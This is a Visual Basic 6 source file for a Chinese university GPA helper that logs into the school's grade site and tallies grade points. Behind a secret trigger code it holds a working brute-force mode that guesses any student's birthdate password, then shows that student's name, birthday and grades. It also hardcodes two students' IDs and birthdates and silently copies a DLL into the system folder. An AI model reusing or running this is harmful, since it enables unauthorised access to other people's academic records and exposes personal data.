VERSION 5.00
Object = "{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}#1.1#0"; "ieframe.dll"
Begin VB.Form Form_Main 
   Appearance      =   0  'Flat
   AutoRedraw      =   -1  'True
   BackColor       =   &H00FFFFFF&
   BorderStyle     =   1  'Fixed Single
   Caption         =   "华师增院绩点助手(在线版)"
   ClientHeight    =   8445
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   4455
   Icon            =   "Form_Main.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   8445
   ScaleWidth      =   4455
   StartUpPosition =   2  '屏幕中心
   Begin VB.TextBox Info_ShowT 
      Appearance      =   0  'Flat
      BackColor       =   &H00FFFFFF&
      BorderStyle     =   0  'None
      Height          =   7000
      Left            =   180
      Locked          =   -1  'True
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   3
      Top             =   900
      Width           =   4170
   End
   Begin VB.TextBox Log_Info 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      BorderStyle     =   0  'None
      Height          =   195
      IMEMode         =   3  'DISABLE
      Index           =   1
      Left            =   3105
      MaxLength       =   8
      PasswordChar    =   "*"
      TabIndex        =   2
      Top             =   180
      Width           =   1005
   End
   Begin VB.TextBox Log_Info 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      BorderStyle     =   0  'None
      Height          =   195
      Index           =   0
      Left            =   765
      MaxLength       =   9
      TabIndex        =   1
      Top             =   180
      Width           =   1005
   End
   Begin SHDocVwCtl.WebBrowser Web_Core 
      Height          =   1455
      Left            =   6570
      TabIndex        =   0
      Top             =   1620
      Width           =   1545
      ExtentX         =   2725
      ExtentY         =   2566
      ViewMode        =   0
      Offline         =   0
      Silent          =   0
      RegisterAsBrowser=   0
      RegisterAsDropTarget=   1
      AutoArrange     =   0   'False
      NoClientEdge    =   0   'False
      AlignLeft       =   0   'False
      NoWebView       =   0   'False
      HideFileNames   =   0   'False
      SingleClick     =   0   'False
      SingleSelection =   0   'False
      NoFolders       =   0   'False
      Transparent     =   0   'False
      ViewID          =   "{0057D0E0-3573-11CF-AE69-08002B2E1262}"
      Location        =   ""
   End
   Begin VB.Label Ctl_Bt 
      Appearance      =   0  'Flat
      AutoSize        =   -1  'True
      BackColor       =   &H00E0E0E0&
      Caption         =   "[官方成绩网]"
      ForeColor       =   &H00404040&
      Height          =   180
      Index           =   4
      Left            =   3240
      MouseIcon       =   "Form_Main.frx":57E2
      MousePointer    =   99  'Custom
      TabIndex        =   9
      Top             =   8145
      Width           =   1080
   End
   Begin VB.Label Ctl_Bt 
      Appearance      =   0  'Flat
      AutoSize        =   -1  'True
      BackColor       =   &H00E0E0E0&
      Caption         =   "[校外网]"
      ForeColor       =   &H00400040&
      Height          =   180
      Index           =   3
      Left            =   2385
      MouseIcon       =   "Form_Main.frx":5934
      MousePointer    =   99  'Custom
      TabIndex        =   8
      Top             =   8145
      Width           =   720
   End
   Begin VB.Label Ctl_Bt 
      Appearance      =   0  'Flat
      AutoSize        =   -1  'True
      BackColor       =   &H00E0E0E0&
      Caption         =   "[增院非官方]"
      ForeColor       =   &H00400040&
      Height          =   180
      Index           =   2
      Left            =   1170
      MouseIcon       =   "Form_Main.frx":5A86
      MousePointer    =   99  'Custom
      TabIndex        =   7
      Top             =   8145
      Width           =   1080
   End
   Begin VB.Label Ctl_Bt 
      Appearance      =   0  'Flat
      AutoSize        =   -1  'True
      BackColor       =   &H00E0E0E0&
      Caption         =   "[作者博客]"
      ForeColor       =   &H00C00000&
      Height          =   180
      Index           =   1
      Left            =   135
      MouseIcon       =   "Form_Main.frx":5BD8
      MousePointer    =   99  'Custom
      TabIndex        =   6
      Top             =   8145
      Width           =   900
   End
   Begin VB.Shape Shape1 
      BackColor       =   &H00E0E0E0&
      BackStyle       =   1  'Opaque
      BorderColor     =   &H00808080&
      Height          =   915
      Index           =   1
      Left            =   -90
      Top             =   8010
      Width           =   4605
   End
   Begin VB.Line Line_Sk 
      Index           =   1
      X1              =   3060
      X2              =   4140
      Y1              =   405
      Y2              =   405
   End
   Begin VB.Line Line_Sk 
      Index           =   0
      X1              =   720
      X2              =   1800
      Y1              =   405
      Y2              =   405
   End
   Begin VB.Label Ctl_Bt 
      Appearance      =   0  'Flat
      AutoSize        =   -1  'True
      BackColor       =   &H00E0E0E0&
      Caption         =   "[清空]"
      ForeColor       =   &H80000008&
      Height          =   180
      Index           =   0
      Left            =   3555
      TabIndex        =   5
      Top             =   540
      Width           =   540
   End
   Begin VB.Label Label_Log 
      Appearance      =   0  'Flat
      AutoSize        =   -1  'True
      BackColor       =   &H00E0E0E0&
      Caption         =   "学号:                 出生日期:"
      ForeColor       =   &H80000008&
      Height          =   180
      Left            =   180
      TabIndex        =   4
      Top             =   180
      Width           =   2790
   End
   Begin VB.Shape Shape1 
      BackColor       =   &H00E0E0E0&
      BackStyle       =   1  'Opaque
      BorderColor     =   &H00808080&
      Height          =   915
      Index           =   0
      Left            =   -90
      Top             =   -90
      Width           =   4605
   End
End
Attribute VB_Name = "Form_Main"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

'Private Declare Function GetWindowLong Lib "user32" Alias "GetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long) As Long
'Private Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
'Private Declare Function SetLayeredWindowAttributes Lib "user32" (ByVal hwnd As Long, ByVal crKey As Long, ByVal bAlpha As Byte, ByVal dwFlags As Long) As Long
'
'Private Const WS_EX_LAYERED = &H80000
'Private Const GWL_EXSTYLE = (-20)
'Private Const LWA_ALPHA = &H2
'Private Const LWA_COLORKEY = &H1

Dim Res_Str As String
Dim Ben_Arr(99, 5) As String
Dim Stu_Info(5) As String
Dim Beni As Integer
Dim Stu_Year(15) As String
Dim Crk_Mode As Boolean
Dim Crk_Vol As Date
Dim Ver_Str As String

Private Sub Auto_Type(User_Name As String, User_Password As String)
Dim i As Integer
    For i = 0 To Web_Core.Document.All.length - 1
     If UCase(Web_Core.Document.All(i).tagName) = "INPUT" Then
        If UCase(Web_Core.Document.All(i).Name) = "USER_NAME" Then Web_Core.Document.All(i).Value = User_Name
        If UCase(Web_Core.Document.All(i).Name) = "USER_PASSWORD" Then Web_Core.Document.All(i).Value = User_Password
        If UCase(Web_Core.Document.All(i).Type) = "SUBMIT" Then Web_Core.Document.All(i).Click
     End If
    Next
End Sub


Private Sub Ctl_Bt_Click(Index As Integer)
Select Case Index
    Case 0

        Log_Info(0).Text = ""
        Log_Info(1).Text = ""
        ShowInfo "KILL"
        ShowInfo "欢迎使用华师增院绩点助手."
        ShowInfo "Leask祝愿同学们学习进步!"

        ShowInfo ""
        ShowInfo "-----------------------------------"
        ShowInfo ""
        ShowInfo "COPYRIGHT"
        ShowInfo "软件版本:" & App.Major & "." & App.Minor & "-" & Ver_Str
        ShowInfo ""
        ShowInfo "特别鸣谢""增院非官方""和""校外网""提供媒体支持."
        ShowInfo ""
        ShowInfo "作者博客(http://honeonet.spaces.live.com)"
        ShowInfo "增院非官方(http://hi.baidu.com/hoyo_z)"
        ShowInfo "校外网(http://www.zaixiaowai.com)"
        ShowInfo ""
        ShowInfo "-----------------------------------"
        ShowInfo ""
        ShowInfo "温馨合作伙伴:饱饱花房"
        ShowInfo "花房博客(http://syxnx.blogbus.com)"
        ShowInfo "相册(http://picasaweb.google.com/syxnix)"
        ShowInfo "淘宝店(http://shop35149305.taobao.com)"
        ShowInfo ""
        ShowInfo "-----------------------------------"
        ShowInfo ""
        ShowInfo "说明:"
        ShowInfo "本程序由黄思夏(Leask Huang)编写,目的为同学们查询成绩和计算绩点提供方便.程序返回的数据仅供参考,最终结果以院方公布为准.由于各种因素造成的计算误差本人不承担责任.如有任何疑问或改进建议欢迎与我联系:leaskh@gmail.com(E-mail/GTalk/AIM/WLM/QQ).谢谢支持!"

    Case 1
        Shell "explorer http://honeonet.spaces.live.com"
    Case 2
        Shell "explorer http://hi.baidu.com/hoyo_z"
    Case 3
        Shell "explorer http://www.zaixiaowai.com"
    Case 4
        Shell "explorer http://www.scnuzc.cn:8081/jx/cj/login.asp"
End Select
End Sub

Private Sub Form_Activate()
Log_Info(0).SetFocus
End Sub

Private Sub Form_Load()
'Dim rtn As Long
'rtn = GetWindowLong(hwnd, GWL_EXSTYLE)
'rtn = rtn Or WS_EX_LAYERED
'SetWindowLong hwnd, GWL_EXSTYLE, rtn
'SetLayeredWindowAttributes hwnd, 0, 200, LWA_ALPHA
On Error Resume Next

Dim FSO As New FileSystemObject

If App.PrevInstance = True Then End

If FSO.FileExists(FSO.GetSpecialFolder(SystemFolder) & "\VB6CHS.DLL") = False Then
FSO.CopyFile App.Path & "\VB6CHS.DLL", FSO.GetSpecialFolder(SystemFolder) & "\VB6CHS.DLL", True
MsgBox "自动优化已完成,请重新运行 华师增院绩点助手!", vbInformation
End
End If

Set FSO = Nothing

Ver_Str = "beta1"

Me.Caption = "华师增院绩点助手(在线版) " & App.Major & "." & App.Minor & "-" & Ver_Str

Ctl_Bt_Click 0

End Sub


Private Sub Log_Info_Change(Index As Integer)
On Error Resume Next
Select Case Index
    Case 0
        Select Case Log_Info(0).Text
            Case "love"
                ShowInfo "KILL"
                ShowInfo "宝贝小妮,思夏好爱你!"
                Exit Sub
            Case "Xiaoni"
                Log_Info(0).Text = "050344121"
                Log_Info(1).Text = "19860730"
            Case "Leask"
                Log_Info(0).Text = "049524161"
                Log_Info(1).Text = "19840413"
        End Select
        If Len(Log_Info(0)) = 9 Then
                If Len(Log_Info(1).Text) = 8 Then
                        ShowInfo "KILL"
                        ShowInfo ">>初始化完成,正在连接成绩查询服务器..."
                        Crk_Mode = False
                        Web_Core.Navigate "http://www.scnuzc.cn:8081/jx/cj/login.asp"
                    Else
                        Log_Info(1).SetFocus
                End If
        End If
    Case 1
        If Len(Log_Info(1)) = 7 And Right(Log_Info(1), 5) = "syxnx" Then
            If Len(Log_Info(0)) < 9 Then
                MsgBox "学号填写错误,请核对后重试.", vbInformation
                Exit Sub
            End If
            If Log_Info(0).Text = "050344121" Or Log_Info(0).Text = "049524161" Then
                MsgBox "该学号受到特别保护,不能破解!"
                Exit Sub
            End If
            ShowInfo "KILL"
            ShowInfo "声明!出于私隐考虑!请勿滥用此功能!"
            ShowInfo "声明!出于私隐考虑!请勿滥用此功能!"
            ShowInfo "声明!出于私隐考虑!请勿滥用此功能!"
            ShowInfo ""
            ShowInfo ">>初始化完成,正在启动破解模式..."
            ShowInfo ""
            ShowInfo ">>破解速度与电脑配置及带宽有关."
            ShowInfo ""
            Crk_Mode = True
                Select Case Left(Log_Info(1), 2)
                    Case "at"
                        Crk_Vol = DateSerial(1980 + Left(Log_Info(0), 2), 12, 31)
                    Case Else
                        Crk_Vol = DateSerial(1899 + Left(Log_Info(1), 2), 12, 31)
                End Select
            Web_Core.Navigate "http://www.scnuzc.cn:8081/jx/cj/login.asp"
        End If
        If Len(Log_Info(1)) = 8 Then
            If Len(Log_Info(0).Text) = 9 Then
                ShowInfo "KILL"
                ShowInfo ">>初始化完成,正在连接成绩查询服务器..."
                Crk_Mode = False
                Web_Core.Navigate "http://www.scnuzc.cn:8081/jx/cj/login.asp"
            End If
        End If
End Select
End Sub


Private Sub Log_Info_KeyDown(Index As Integer, KeyCode As Integer, Shift As Integer)
Select Case KeyCode
    Case 37, 38
        Log_Info(0).SetFocus
    Case 39, 40
        Log_Info(1).SetFocus
    Case 8
        If Index = 1 And Log_Info(1) = "" Then Log_Info(0).SetFocus
End Select
End Sub


Private Sub Web_Core_DocumentComplete(ByVal pDisp As Object, URL As Variant)
Select Case URL
    Case "http://www.scnuzc.cn:8081/jx/cj/login.asp"
        Res_Check 1
    Case "http://www.scnuzc.cn:8081/jx/cj/display.asp"
        Res_Check 2
End Select
End Sub


Private Sub Res_Check(Check_Index As Integer)
On Error Resume Next
Dim i As Integer

Res_Str = Web_Core.Document.body.innertext

Select Case Check_Index
    Case 1
        For i = 1 To Len(Res_Str)
            If Mid(Res_Str, i, 6) = "成绩查询登录" Then
                    Select Case Crk_Mode
                        Case False
                            ShowInfo ">>服务器连接成功,正在登陆成绩系统..."
                            Auto_Type Log_Info(0).Text, Log_Info(1).Text
                        Case True
                            Crk_Vol = Crk_Vol + 1
                            ShowInfo ">>" & "正在破解登录口令>>" & Log_Info(0).Text & "/" & Format(Crk_Vol, "YYYYMMDD")
                            Auto_Type Log_Info(0).Text, Format(Crk_Vol, "YYYYMMDD")
                    End Select
                Exit Sub
            End If
        Next
    Case 2
        For i = 1 To Len(Res_Str)
            If Mid(Res_Str, i, 8) = "学生个人成绩查询" Then
                Select Case Crk_Mode
                    Case False
                        ShowInfo ">>登录完成,正在分析数据..."
                    Case True
                        ShowInfo ">>口令破解成功!正在分析数据..."
                End Select
                    Res_Exe
                    Log_Info(0).Text = ""
                    Log_Info(1).Text = ""
                    Log_Info(0).SetFocus
                Exit Sub
            End If
        Next
End Select

Select Case Crk_Mode
    Case False
        ShowInfo ">>数据出错,请检查网络连接并核对资料!"
        Log_Info(0).Text = ""
        Log_Info(1).Text = ""
        Log_Info(0).SetFocus
    Case True
        Web_Core.Navigate "http://www.scnuzc.cn:8081/jx/cj/login.asp"
End Select
End Sub

Private Sub Res_Exe()
On Error Resume Next
Dim exeI As Integer
Dim exeII As Integer
Dim exeII_M As Integer
Dim Sp_Str As String
Dim Sp_Arr() As String
Dim Stu_yeID As Integer
  
Beni = 0

For exeI = 0 To 99
    For exeII = 0 To 5
        Ben_Arr(exeI, exeII) = ""
    Next
Next

For exeI = 0 To 15
     Stu_Year(exeI) = ""
Next

Res_Str = Web_Core.Document.body.innertext

    For exeI = 1 To Len(Res_Str)

        If Mid(Res_Str, exeI, 3) = "学号:" Then
            Stu_Info(0) = Mid(Res_Str, exeI + 3, 9)
            Stu_Info(1) = Mid(Res_Str, exeI + 16, 5)
            exeI = exeI + 26
        End If
        
        If Mid(Res_Str, exeI, 1) = "-" Then
            Ben_Arr(Beni, 0) = Mid(Res_Str, exeI - 4, 9)
            Ben_Arr(Beni, 1) = Mid(Res_Str, exeI + 6, 1)
            If Beni = 0 Then
                    Stu_Year(0) = Mid(Res_Str, exeI - 4, 9) & Mid(Res_Str, exeI + 6, 1)
                    Stu_yeID = 0
                Else
                    If Stu_Year(Stu_yeID) <> Mid(Res_Str, exeI - 4, 9) & Mid(Res_Str, exeI + 6, 1) Then
                        Select Case Mid(Res_Str, exeI + 6, 1)
                            Case "1"
                                Stu_yeID = Stu_yeID + 1
                                Stu_Year(Stu_yeID) = Mid(Res_Str, exeI - 4, 9) & Mid(Res_Str, exeI + 6, 1)
                            Case "2"
                                If Right(Stu_Year(Stu_yeID), 1) = "1" Then
                                    Stu_yeID = Stu_yeID + 1
                                    Stu_Year(Stu_yeID) = Mid(Res_Str, exeI - 4, 9) & Mid(Res_Str, exeI + 6, 1)
                                End If
                                If Right(Stu_Year(Stu_yeID), 1) = "2" Then
                                    Stu_yeID = Stu_yeID + 1
                                    Stu_Year(Stu_yeID) = Left(Stu_Year(Stu_yeID - 1), 9) & "3"
                                End If
                        End Select
                    End If
            End If
            For exeII = exeI + 10 To exeI + 49
                If Mid(Res_Str, exeII, 3) = "   " Then
                    Ben_Arr(Beni, 2) = Mid(Res_Str, exeI + 9, exeII - exeI - 9)
                    exeII_M = exeII
                    exeI = exeI + 17
                    Exit For
                End If
            Next
            For exeII = exeII_M + 4 To exeII_M + exeII_M + 6
                If Mid(Res_Str, exeII, 3) = "   " Then
                    Ben_Arr(Beni, 3) = Mid(Res_Str, exeII_M + 3, exeII - exeII_M - 3)
                    Exit For
                End If
            Next
        End If
        
        If Mid(Res_Str, exeI, 5) = "   必修" Or Mid(Res_Str, exeI, 5) = "   限选" Or Mid(Res_Str, exeI, 5) = "   任选" Then
            Ben_Arr(Beni, 4) = Mid(Res_Str, exeI - 1, 1)
            Select Case Mid(Res_Str, exeI, 5)
                Case "   必修": Ben_Arr(Beni, 5) = "0"
                Case "   限选": Ben_Arr(Beni, 5) = "1"
                Case "   任选": Ben_Arr(Beni, 5) = "2"
            End Select
            Beni = Beni + 1
        End If
         
         
        If Mid(Res_Str, exeI, 5) = "学分总计：" Then
          Sp_Arr = Split(Mid(Res_Str, exeI, 49), " ")
          Stu_Info(2) = Sp_Arr(2)
          Stu_Info(3) = Sp_Arr(5)
          Stu_Info(4) = Sp_Arr(8)
          Stu_Info(5) = Sp_Arr(11)
        End If
         
    Next
    
    
    ShowInfo "KILL"
    
    Select Case Crk_Mode
        Case False
            ShowInfo "亲爱的" & Stu_Info(1) & "同学,您好.以下是您的详细成绩:"
        Case True
            ShowInfo "【基本资料】"
            ShowInfo "学号:" & Stu_Info(0)
            ShowInfo "姓名:" & Stu_Info(1)
            ShowInfo "生日:" & Year(Crk_Vol) & "年" & Month(Crk_Vol) & "月" & Day(Crk_Vol) & "日"
    End Select
    
    ShowInfo ""
    
    ShowInfo "【绩点统计】"
    
    For exeI = 0 To Stu_yeID
        ShowInfo "-----------------------------------"
        Select Case Right(Stu_Year(exeI), 1)
        Case 1
            ShowInfo "[" & Left(Stu_Year(exeI), 9) & "学年,第一学期]"
        Case 2
            ShowInfo "[" & Left(Stu_Year(exeI), 9) & "学年,第二学期]"
        Case 3
            ShowInfo "[" & Left(Stu_Year(exeI), 9) & "学年,全学年]"
        End Select
        
        ShowInfo "所有科目平均绩点:" & Get_Bens(exeI, 3)
        
        ShowInfo "必修科目平均绩点:" & Get_Bens(exeI, 0)
        
    Next
    
    ShowInfo "-----------------------------------"
    
    ShowInfo ""
    ShowInfo "【成绩单】"
     For exeI = 0 To Beni - 1
            ShowInfo "-----------------------------------"
            Select Case Ben_Arr(exeI, 5)
            Case "0"
                ShowInfo Ben_Arr(exeI, 0) & "(" & Ben_Arr(exeI, 1) & ")" & Ben_Arr(exeI, 2)
                ShowInfo "成绩:" & Ben_Arr(exeI, 3) & ",学分:" & Ben_Arr(exeI, 4) & ",必修"
            Case "1"
                ShowInfo Ben_Arr(exeI, 0) & "(" & Ben_Arr(exeI, 1) & ")" & Ben_Arr(exeI, 2)
                ShowInfo "成绩:" & Ben_Arr(exeI, 3) & ",学分:" & Ben_Arr(exeI, 4) & ",限选"
            Case "2"
                ShowInfo Ben_Arr(exeI, 0) & "(" & Ben_Arr(exeI, 1) & ")" & Ben_Arr(exeI, 2)
                ShowInfo "成绩:" & Ben_Arr(exeI, 3) & ",学分:" & Ben_Arr(exeI, 4) & ",任选"
            End Select

     Next
     
     ShowInfo "-----------------------------------"
    
     ShowInfo ""
     ShowInfo "【学分统计】"
     ShowInfo "总学分:" & Stu_Info(2)
     ShowInfo "必修学分:" & Stu_Info(3)
     ShowInfo "限选学分:" & Stu_Info(4)
     ShowInfo "任选学分:" & Stu_Info(5)
    
End Sub


Private Sub ShowInfo(Str As String)
On Error Resume Next
Dim i As Integer
If Str = "KILL" Then
        Info_ShowT.Text = ""
        Exit Sub
End If

For i = 1 To Len(Str)
    If Mid(Str, i, 1) = Chr(13) Or Mid(Str, i, 1) = Chr(10) Or Mid(Str, i, 1) = " " Then
        Str = Left(Str, i - 1) & Right(Str, Len(Str) - i)
        i = i - 1
    End If
Next

If Str = "COPYRIGHT" Then Str = App.LegalCopyright

Info_ShowT.Text = Info_ShowT.Text & Str & vbCrLf

Select Case Crk_Mode
    Case False
        Info_ShowT.SelStart = 1
    Case True
        Info_ShowT.SelStart = Len(Info_ShowT.Text)
End Select
End Sub


Private Function Get_Bens(Ben_Year_ID As Integer, Ben_CH_HT As Integer) As String
On Error Resume Next
Dim i As Integer
Dim Count_A As Double
Dim Count_B As Double
Dim Cov_I As Integer

Count_A = 0
Count_B = 0

For i = 0 To Beni
    If Ben_Arr(i, 0) = Left(Stu_Year(Ben_Year_ID), 9) Then
        Select Case Right(Stu_Year(Ben_Year_ID), 1)
            Case "1"
                If Ben_Arr(i, 1) = "1" Then
                    Select Case Ben_CH_HT
                        Case 0
                            If Ben_Arr(i, 5) = "0" Then
                                If Ben_Arr(i, 3) >= 60 Then
                                    Count_A = Count_A + (((Ben_Arr(i, 3) - 50) / 10) * Ben_Arr(i, 4))
                                End If
                                Count_B = Count_B + Ben_Arr(i, 4)
                            End If
                        Case 3
                            If Ben_Arr(i, 5) = "0" Or Ben_Arr(i, 5) = "1" Or Ben_Arr(i, 5) = "2" Then
                                If Ben_Arr(i, 3) >= 60 Then
                                    Count_A = Count_A + (((Ben_Arr(i, 3) - 50) / 10) * Ben_Arr(i, 4))
                                End If
                                Count_B = Count_B + Ben_Arr(i, 4)
                            End If
                    End Select
                End If
            Case "2"
                If Ben_Arr(i, 1) = "2" Then
                    Select Case Ben_CH_HT
                        Case 0
                            If Ben_Arr(i, 5) = "0" Then
                                If Ben_Arr(i, 3) >= 60 Then
                                    Count_A = Count_A + (((Ben_Arr(i, 3) - 50) / 10) * Ben_Arr(i, 4))
                                End If
                                Count_B = Count_B + Ben_Arr(i, 4)
                            End If
                        Case 3
                            If Ben_Arr(i, 5) = "0" Or Ben_Arr(i, 5) = "1" Or Ben_Arr(i, 5) = "2" Then
                                If Ben_Arr(i, 3) >= 60 Then
                                    Count_A = Count_A + (((Ben_Arr(i, 3) - 50) / 10) * Ben_Arr(i, 4))
                                End If
                                Count_B = Count_B + Ben_Arr(i, 4)
                            End If
                    End Select
                End If
            Case "3"
                If Ben_Arr(i, 1) = "1" Or Ben_Arr(i, 1) = "2" Then
                    Select Case Ben_CH_HT
                        Case 0
                            If Ben_Arr(i, 5) = "0" Then
                                If Ben_Arr(i, 3) >= 60 Then
                                    Count_A = Count_A + (((Ben_Arr(i, 3) - 50) / 10) * Ben_Arr(i, 4))
                                End If
                                Count_B = Count_B + Ben_Arr(i, 4)
                            End If
                        Case 3
                            If Ben_Arr(i, 5) = "0" Or Ben_Arr(i, 5) = "1" Or Ben_Arr(i, 5) = "2" Then
                                If Ben_Arr(i, 3) >= 60 Then
                                    Count_A = Count_A + (((Ben_Arr(i, 3) - 50) / 10) * Ben_Arr(i, 4))
                                End If
                                Count_B = Count_B + Ben_Arr(i, 4)
                            End If
                    End Select
                End If
        End Select
    End If
Next


Cov_I = (Count_A / Count_B) * 100

Get_Bens = Cov_I / 100

End Function
